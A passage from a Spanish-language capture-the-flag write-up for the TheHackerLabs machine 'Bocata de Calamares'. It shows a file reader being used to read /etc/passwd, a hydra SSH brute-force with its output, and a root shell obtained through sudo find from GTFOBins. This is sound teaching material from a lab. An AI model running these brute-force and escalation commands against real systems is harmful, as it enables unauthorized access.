+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 0.630275
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">77</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">74</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 122.1688
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-z, file</em></td>
+					<td>Indica un archivo a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-d</em></td>
+					<td>Define los datos para la petición POST.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;sc</em></td>
+					<td>Filtro solo muestra resultados con un código HTTP específico.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Funcionó y podemos probar esas inyecciones y verás que funcionarán.</p>
+<h3 id="admin">Analizando Página Web admin.php y Lector de Archivos Internos</h3>
+<p>Regresemos a la página donde entramos después del login:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura8.png">
+</p>
+<p>Vemos que menciona una lista de cosas por hacer (<strong>to-do-list</strong>):</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura9.png">
+</p>
+<p>Al entrar, vemos que deja un mensaje en donde creo un lector de ficheros internos, pero que el nombre de este script al que llamo <strong>leer_archivos</strong>, lo códifico a <strong>base64</strong>.</p>
+<p>Al codificar este nombre de manera correcta, sin que use un salto de línea, no encontraremos ese archivo, pero si lo codificamos con ese salto de línea es posible que lo encontremos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;lee_archivos&#34;</span> | base64
+</span></span><span style="display:flex;"><span>bGVlX2FyY2hpdm9zCg<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>Busquemos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura10.png">
+</p>
+<p>Bien, lo encontramos.</p>
+<p>Si revisamos su código fuente, veremos un par de comentarios:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura11.png">
+</p>
+<p>Prácticamente, nos están dando la pista de que podemos aplicarle fuerza bruta a los usuarios de la máquina víctima.</p>
+<p>Veamos si es posible leer el <code>/etc/passwd</code>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura12.png">
+</p>
+<p>Tenemos dos usuarios, quizá algunos de ellos podamos obtener su contraseña.</p>
+<h3 id="FuerzaBruta">Aplicando Fuerza Bruta a Usuario del Servicio SSH y Ganando Acceso a la Máquina Víctima</h3>
+<p>Utilizaremos la herramienta <strong>hydra</strong> para aplicar la fuerza bruta a los usuarios del <strong>servicio SSH</strong>.</p>
+<p>De los dos usuarios existentes, del que podemos encontrar su contraseña, es del <strong>usuario superadministrator</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l <span style="color:#e6db74">&#39;superadministrator&#39;</span> -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.220 -t <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2025-07-24 13:22:10
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">64</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">64</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~224132 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://192.168.10.220:22/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 192.168.10.220   login: superadministrator   password: ******
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">21</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">21</span> targets did not resolve or could not be connected
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2025-07-24 13:22:20
+</span></span></code></pre></div><p>La tenemos, ahora probemos esa contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh superadministrator@192.168.10.220
+</span></span><span style="display:flex;"><span>superadministrator@192.168.10.220<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 24.04.1 LTS <span style="color:#f92672">(</span>GNU/Linux 6.8.0-51-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Fri Jan <span style="color:#ae81ff">10</span> 17:42:22 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>superadministrator@thehackerslabs-bocatacalamares:~$ whoami
+</span></span><span style="display:flex;"><span>superadministrator
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="find">Escalada de Privilegios con Permisos Sudoers sobre Binario find</h3>
+<p>Veamos qué archivos tiene este usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>superadministrator@thehackerslabs-bocatacalamares:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">3</span> superadministrator superadministrator <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2025</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root               root               <span style="color:#ae81ff">4096</span> Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2025</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root               root                  <span style="color:#ae81ff">9</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2025</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> superadministrator superadministrator  <span style="color:#ae81ff">220</span> Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2025</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> superadministrator superadministrator <span style="color:#ae81ff">3771</span> Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2025</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> superadministrator superadministrator <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2025</span> .cache
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root               root                 <span style="color:#ae81ff">13</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2025</span> flag.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> superadministrator superadministrator  <span style="color:#ae81ff">807</span> Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2025</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root               root                <span style="color:#ae81ff">125</span> Jan  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2025</span> recordatorio.txt
+</span></span></code></pre></div><p>Tenemos la flag y un mensaje.</p>
+<p>Leamos ambos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>superadministrator@thehackerslabs-bocatacalamares:~$ cat flag.txt
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>superadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt 
+</span></span><span style="display:flex;"><span>Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.
+</span></span></code></pre></div><p>Bien, el mensaje del archivo <strong>recordatorio.txt</strong> es una pista sobre cómo escalar privilegios.</p>
+<p>Veamos qué privilegios tiene este usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>superadministrator@thehackerslabs-bocatacalamares:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> superadministrator on thehackerslabs-bocatacalamares:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User superadministrator may run the following commands on thehackerslabs-bocatacalamares:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/find
+</span></span></code></pre></div><p>Busquemos una forma de escalar privilegios usando el <strong>binario find</strong> con la <strong>guía de GTFOBins</strong>.</p>
+<p>Encontramos una:</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/find/" target="_blank">GTFOBins: find</a></li>
+</ul>
+<p>Utilizaremos el siguiente comando:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura13.png">
+</p>
+<p>Probémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>superadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/bash <span style="color:#ae81ff">\;</span> -quit
+</span></span><span style="display:flex;"><span>root@thehackerslabs-bocatacalamares:/home/superadministrator# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Ya solo busquemos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@thehackerslabs-bocatacalamares:/home/tyuiop# cd /root
+</span></span><span style="display:flex;"><span>root@thehackerslabs-bocatacalamares:~# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@thehackerslabs-bocatacalamares:~# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener noreferrer">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></li><li><a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/find/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-debugsec/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Debugsec - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-cachopo/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Cachopo - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
